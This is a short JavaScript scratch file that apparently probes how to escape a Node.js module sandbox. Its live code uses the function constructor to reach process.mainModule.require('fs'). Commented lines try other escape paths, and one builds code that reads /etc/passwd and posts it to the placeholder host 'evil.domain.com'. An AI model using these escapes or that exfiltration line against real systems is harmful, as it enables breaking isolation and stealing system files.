//var other = require("./other.js");

var genetics = require("genetics");

// Ouch
console.log.constructor('console.log(process.mainModule.require("fs"))')();

//console.log((new module.constructor())._compile('require("./")'));

//console.log(Object.getOwnPropertyNames(function(){return this}()).toString().replace(/\,/g,'\n'))

//func.call(func, "var fs = process.mainModule.require('fs');var http = process.mainModule.require('http');var req = http.request({host: 'evil.domain.com'}); req.write(fs.readFileSync('/etc/passwd').toString());req.end();");

//console.log(arguments.callee.caller.apply(arguments.callee.caller.arguments, ["debug('hepp')", "bah.js"]))

//console.log(this.constructor.name)

//console.log(Object.getOwnPropertyNames(function(){return this}()).toString().replace(/\,/g,'\n'))
